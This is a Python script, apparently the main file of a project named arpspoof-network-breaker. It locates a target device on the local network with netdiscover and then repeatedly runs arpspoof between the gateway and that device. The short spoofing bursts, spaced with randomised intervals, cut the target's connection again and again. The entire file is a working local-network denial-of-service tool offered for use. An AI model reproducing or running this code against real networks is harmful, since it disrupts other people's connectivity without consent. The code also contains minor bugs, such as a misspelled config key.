# -*- coding: utf-8 -*-
# main.py
# Copyright (C) 2018 Too-Naive
#
# This module is part of arpspoof-network-breaker and is released under
# the AGPL v3 License: https://www.gnu.org/licenses/agpl-3.0.txt
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.
import subprocess, signal, random
import time, netifaces, sys, re, socket
from configparser import ConfigParser

mac_match = re.compile(r'^(([0-9a-f]){2}[:-]){5}([0-9a-f]{2})$')
ip_match = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')

def printl(string: str):
	print('{}: {}'.format(time.strftime('%Y-%m-%d %H:%M:%S'), string))

def vaildate_ip(ip_addr: str):
	try:
		socket.inet_aton(ip_addr)
	except socket.error:
		return False
	return True

class arpspoof_class(object):
	def __init__(self, *, des_mac: str or None = None, des_ip: str or None = None, sleep_time: int = 60, arp_blocktime: int = 2, random_time: int = 0):
		self.gateway_ip = ''
		if len(sys.argv) > 1:
			if mac_match.match(sys.argv[1]) is not None:
				self.des_mac, self.des_ip = sys.argv[1], None
			elif vaildate_ip(sys.argv[1]):
				self.des_ip, self.des_mac = sys.argv[1], None
		else:
			self.des_ip, self.des_mac = des_ip, des_mac
		if self.des_ip is None and self.des_mac is None:
			raise ValueError('Both vaule is none')
		else:
			if des_ip is not None:
				if not vaildate_ip(self.des_ip): raise ValueError('IP address is invaild')
			elif mac_match.match(self.des_mac) is None:
				raise ValueError('Mac address is invaild')
		if self.des_ip is None:
			self.get_ip_from_mac()
		for _, interface in netifaces.gateways()['default'].items():
			if 'eth0' in interface:
				self.gateway_ip = interface[0]
				break
		if self.gateway_ip == '':
			print(netifaces.gateways())
			raise ValueError('Gateway ip error')
		self.sleep_time = int(sleep_time)
		self.current_sleep_time = self.sleep_time
		self.arp_blocktime = int(arp_blocktime)
		self.random_time = int(random_time)
	def get_ip_from_mac(self):
		addrs, netmask, self.self_ip = netifaces.ifaddresses('eth0'), '', ''
		for _, li in addrs.items():
			if vaildate_ip(li[0]['addr']):
				netmask = li[0]['netmask']
				self.self_ip = li[0]['addr']
				break
		if netmask == '':
			print(repr(addrs))
			raise ValueError('Cannot find netmask')
		ip_group = self.self_ip.split('.')
		netmask_group = netmask.split('.')
		breaksig = 4
		for x in range(3, -1, -1):
			if netmask_group[x] == '0':
				ip_group[x] = '0'
			else: 
				breaksig = 5 - x
				break
		self.search_ip = '{}.{}.{}.{}/{}'.format(*ip_group, 8 * breaksig)
		#print(self.search_ip)
		self.des_ip = self._call_netdiscover_search(self.search_ip, self.des_mac)
	@staticmethod
	def get_random_time(base_time: int, random_range: int):
		if random_range == 0: return base_time
		return random.randint(base_time - random_range if base_time - random_range < 0 else 0, base_time + random_range)
	@staticmethod
	def _call_netdiscover_search(search_ip: str, mac_addr: str):
		netdiscover_proc = subprocess.Popen(['netdiscover', '-r', search_ip, '-P'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
		#time.sleep(5)
		netdiscover_proc.wait()
		netdiscover_proc.send_signal(signal.SIGINT)
		for x in netdiscover_proc.communicate()[0].decode().splitlines():
			if mac_addr.lower() in x:
				newl = x
				break
		#print(repr(x.split()))
		return x.split()[0]
	def main_spoof(self):
		printl('Start spoof')
		spoof = subprocess.Popen(['arpspoof', '-i', 'eth0', '-t', self.gateway_ip, '-r', self.des_ip])
		time.sleep(self.arp_blocktime if self.random_time == 0 else self.arp_blocktime + random.randint(0, 2))
		spoof.send_signal(signal.SIGINT)
		printl('Wait arpspoof to exit (fix connection)')
		spoof.wait()
		self.current_sleep_time = self.get_random_time(self.sleep_time, self.random_time)
		printl('Exited!(sleep {}(s))'.format(self.current_sleep_time))
	def main_activity(self):
		while True:
			try:
				self.main_spoof()
				time.sleep(self.current_sleep_time)
			except KeyboardInterrupt:
				while True:
					try:
						input('Paused, press Enter to continue')
						break
					except (EOFError, KeyboardInterrupt): 
						return
			except:
				import traceback
				print(self.des_ip, self.des_mac, self.search_ip, self.gateway_ip)
				traceback.print_exc()
def main():
	if len(sys.argv) == 2:
		arpspoof_class().main_activity()
	config = ConfigParser()
	if len(config.read('config.ini')) == 0 or not config.has_section('arpspoof') or not (config.has_option('arpspoof', 'mac') or config.has_option('arpsoof', 'ip')):
		raise FileNotFoundError('Cannot find configure file')
	arpspoof_class(
		des_ip = config['arpspoof']['ip'] if config.has_option('arpspoof', 'ip') and config['arpspoof']['ip'] != '' else None,
		des_mac = config['arpspoof']['mac'] if config.has_option('arpspoof', 'mac') and config['arpspoof']['mac'] != '' else None,
		sleep_time = config['arpspoof']['interval'] if config.has_option('arpspoof', 'interval') and config['arpspoof']['interval'] != '' else 60,
		arp_blocktime = config['arpspoof']['blocktime'] if config.has_option('arpspoof', 'blocktime') and config['arpspoof']['blocktime'] != '' else 2,
		random_time = config['arpspoof']['random_time'] if config.has_option('arpspoof', 'random_time') and config['arpspoof']['random_time'] != '' else 0
	).main_activity()

if __name__ == '__main__':
	main()